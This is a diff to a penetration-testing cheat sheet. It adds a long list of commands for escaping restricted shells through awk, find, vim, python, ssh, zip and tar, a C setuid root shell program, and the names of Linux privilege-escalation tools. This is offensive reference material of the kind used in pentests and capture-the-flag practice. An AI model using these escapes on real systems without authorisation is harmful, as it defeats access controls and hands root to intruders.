@@ -827,9 +827,17 @@ Bash one-liner reverse shell:
 
 **Restricted shell escape techniques:**
 
-First, get your restricted shell type by hitting: ``$SHELL`` or ``$0``
+Get your restricted shell type by hitting: ``$SHELL`` or ``$0``
 
-For ``lshell``:
+First, check available commands such as ``cd``, ``ls``, ``echo``, etc.
+Second, check for available operators such as ``>``, ``>>``, ``<``, ``|``.
+Third, check available programming languages such as ``perl``, ``ruby``, ``python``, etc.
+Fourth, check whether you can run commands as root ``sudo -l``.
+Fifth, check environmental variables ``run env`` or ``printenv``
+
+##
+
+**For** ``lshell``:
 
 ```
 # echo os.system('/bin/bash')
@@ -877,13 +885,236 @@ FREEDOM!
 
 ##
 
-For ``rbash``:
+**For** ``rbash``:
 
-- Check out #1: https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf
-- Check out #2: https://d00mfist.gitbooks.io/ctf/content/escaping_restricted_shell.html
-- Check out #3: https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/
+**Common Exploitation Techniques:**
+
+If ``/`` is allowed, you can run ``/bin/sh`` or ``/bin/bash``
+
+If ``cp`` is allowed, you can copy ``/bin/sh`` or ``/bin/bash`` to your own directory.
+
+From ``ftp``, ``gdb``, ``more``, ``man``, or ``less``:
+
+```
+xxx > !/bin/sh
+
+or
+
+xxx > !/bin/bash
+```
+
+From ``rvim``:
+
+```
+:python import os; os.system("/bin/bash")
+```
+
+From ``scp``:
+
+```
+# scp -S /path/yourscript x y:
+```
+
+From ``awk``:
+
+```
+# awk 'BEGIN {system("/bin/sh")}'
+
+or
+
+# awk 'BEGIN {system("/bin/bash")}'
+```
+
+From ``find``:
+
+```
+# find / -name test -exec /bin/sh \;
+
+or
+
+# find / -name test -exec /bin/bash \;
+```
+##
+
+**Programming Languages Techniques:**
+
+From ``except``:
+
+```
+# except spawn sh
+```
+
+From ``python``:
+
+```
+# python -c 'import os;os.system("/bin/sh")'
+
+or
+
+# python3 -c 'import os;os.system("/bin/sh")'
+```
+
+From ``php``:
+
+```
+# php -a then exec("sh -i");
+```
+
+From ``perl``:
+
+```
+# perl -e 'exec "/bin/sh";'
+```
+
+From ``lua``:
+
+```
+# os.execute('/bin/sh')
+```
+
+From ``ruby``:
+
+```
+# exec "/bin/sh"
+```
+
+**Advanced Techniques:**
+
+From ``ssh``:
+
+```
+# ssh <USER>@<RHOST> -t "/bin/sh"
+
+or
+
+# ssh <USER>@<RHOST> -t "/bin/bash"
+
+or
+
+# ssh <USER>@<RHOST> -t "bash --noprofile"
+
+or
+
+# ssh <USER>@<RHOST> -t "() { :; }; /bin/bash" 
+
+or
+
+# ssh -o ProxyCommand="sh -c /tmp/<FILE>.sh"127.0.0.1     <- SUID
+```
+
+From ``git``:
+
+```
+# git help status
+# !/bin/bash
+```
+
+From ``pico``:
+
+```
+# pico -s "/bin/bash"
+# /bin/bash <CTRL+T>
+```
+
+From ``zip``:
+
+```
+# zip /tmp/<FILE>.zip /tmp/<FILE> -T --unzip-command="sh -c /bin/bash"
+```
+
+From ``tar``:
+
+```
+# tar cf /dev/null <FILE> --checkpoint=1 --checkpoint-action=exec=/bin/bash
+```
+
+From ``chsh`` ***(authenticated)***:
+
+```
+/bin/bash
+```
+
+From ``cp``, if we can copy files into existing ``PATH``:
+
+```
+#cp /bin/sh /current_directory; sh
+```
+
+From ``tee``:
+
+```
+# echo "<PAYLOAD>" | tee <FILE>.sh
+```
+
+From ``vim``:
+
+```
+:!/bin/ls -l .b*        <- File Listing
+
+:set shell=/bin/sh
+:shell
+
+or
+
+:!/bin/sh
+```
+
+``C`` set UID shell:
+
+```
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+
+int main(int argc, char **argv, char **envp) {
+   setresgid(getegid(), getegid(), getegid());
+   setresuid(geteuid(), geteuid(), geteuid());
+   
+   execve("/bin/sh", argv, envp);
+   return 0;
+}
+```
+
+If we can set ``PATH`` or ``SHELL`` variable:
+
+```
+# export PATH=/bin:/usr/bin:/sbin:$PATH
+# export SHELL=/bin/sh
+```
+
+From ``ne`` *(nice editor)*:
+
+Go to -> ``Prefs`` -> ``Load Prefs...``      <- Read Files
+
+From ``lynx``:
+
+```
+# lynx --editor=/usr/bin/vim <PAYLOAD>
+# export EDITOR=/usr/bin/vim
+```
+
+From ``mutt``:
+
+Click ``!``:
+
+```
+/bin/sh
+```
 
 ##
+
+**Useful tools:**
+
+- LinPEAS
+- LinEnum
+- LinPrivChecker
+- LinuxExploitSuggester2
+- Pspy64
+- Traitor (SUID)
+
+-------------------------------------------------------------
+
+## Privilege Escalation | Windows
 
 -------------------------------------------------------------
 
